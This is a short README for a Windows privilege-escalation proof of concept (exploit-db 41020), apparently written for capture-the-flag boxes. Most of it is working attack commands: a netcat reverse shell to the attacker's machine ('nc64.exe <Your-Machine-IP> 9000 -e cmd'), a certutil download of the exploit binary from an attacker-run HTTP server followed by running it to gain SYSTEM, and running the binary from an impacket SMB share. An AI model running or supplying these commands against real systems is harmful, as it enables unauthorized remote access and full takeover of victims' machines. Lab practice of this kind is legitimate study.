Important Note : This POC is only tested on Windows 8.1 x64 and Windows 2012 R2 x64. May not work on others. Do NOT try this POC from a Powershell Reverse Shell. if you are happened to be on a Powershell like I was then upload [netcat](https://github.com/int0x33/nc.exe/raw/master/nc64.exe) binary and send a cmd shell to your local netcat listener :

```sh
.\nc64.exe <Your-Machine-IP> 9000 -e cmd
```

Usually CTF boxes don't connect to Internet links so in that case download POC binary in your local machine from [Here](https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe) then start a python SimpleHTTPServer on port 8000. On the target machine :

```sh
certutil.exe -urlcache -split -f "http://<Your-Machine-IP>:8000/41020.exe" 41020.exe
.\41020.exe
```

If the program didn't hang, check whoami you are already System! Alternatively you can start a samba server on your local machine using impacket-smbserver

```sh
sudo impacket-smbserver myshare `pwd` -smb2
```

and run the exe directly from network like this :

```sh
\\<Your-Machine-IP>\myshare\41020.exe
```
